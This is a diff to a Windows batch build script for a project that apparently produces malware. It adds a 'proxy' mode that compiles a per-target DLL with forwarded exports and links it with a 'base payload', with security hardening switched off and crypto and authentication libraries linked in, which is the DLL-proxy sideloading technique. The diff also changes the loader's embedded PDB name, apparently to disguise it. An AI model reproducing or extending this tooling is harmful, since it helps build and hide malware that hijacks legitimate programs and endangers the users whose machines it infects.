@@ -52,6 +52,8 @@ echo [build] msvc:  %MSVC_ROOT%
 echo [build] sdk:   %SDK_VER%
 echo [build] rc:    %RC%
 
+if /i "%~1"=="proxy" goto :proxy_clang
+
 if not exist bin mkdir bin
 del /q bin\ckdll.exp bin\ckdll.lib 2>nul
 
@@ -81,11 +83,22 @@ if errorlevel 1 ( echo [build] RC FAILED & exit /b 1 )
 
 "%CLANG_BIN%\clang-cl.exe" /nologo /O2 /MT /std:c++17 /utf-8 ^
    src\loader.cpp bin\loader.res /Fe:bin\loader.exe -fuse-ld=lld ^
-   /link /SUBSYSTEM:WINDOWS /PDBALTPATH:fontcache.pdb user32.lib advapi32.lib
+   /link /SUBSYSTEM:WINDOWS /PDBALTPATH:launcher.pdb user32.lib advapi32.lib
 if errorlevel 1 ( echo [build] LOADER BUILD FAILED & exit /b 1 )
 
 echo [build] ALL OK (clang-cl)
 for %%f in (bin\ckdll.dll bin\loader.exe bin\ckdec.exe) do echo [build]   %%~nxf  %%~zf bytes
+exit /b 0
+
+:proxy_clang
+REM proxy DEF OUT IMPLIB PDB -- per-target DLL with forwarded exports.
+if "%~5"=="" ( echo [build] usage: build_clang.bat proxy DEF OUT IMPLIB PDB & exit /b 2 )
+if not exist bin\chkstk.obj ( echo [build] build the base payload first & exit /b 2 )
+"%CLANG_BIN%\clang-cl.exe" /nologo /LD /Od /Oi- /GS- /Gs4096 /utf-8 -fuse-ld=lld ^
+   src\ckdll.cpp src\proxy.cpp bin\chkstk.obj /Fe:"%~3" ^
+   /link /DLL /INCREMENTAL:NO /NODEFAULTLIB /ENTRY:proxy_entry /GUARD:NO /MACHINE:X64 ^
+         /DEF:"%~2" /IMPLIB:"%~4" /PDB:"%~5" kernel32.lib crypt32.lib bcrypt.lib iphlpapi.lib secur32.lib
+if errorlevel 1 ( echo [build] PROXY BUILD FAILED & exit /b 1 )
 exit /b 0
 
 :no_clang
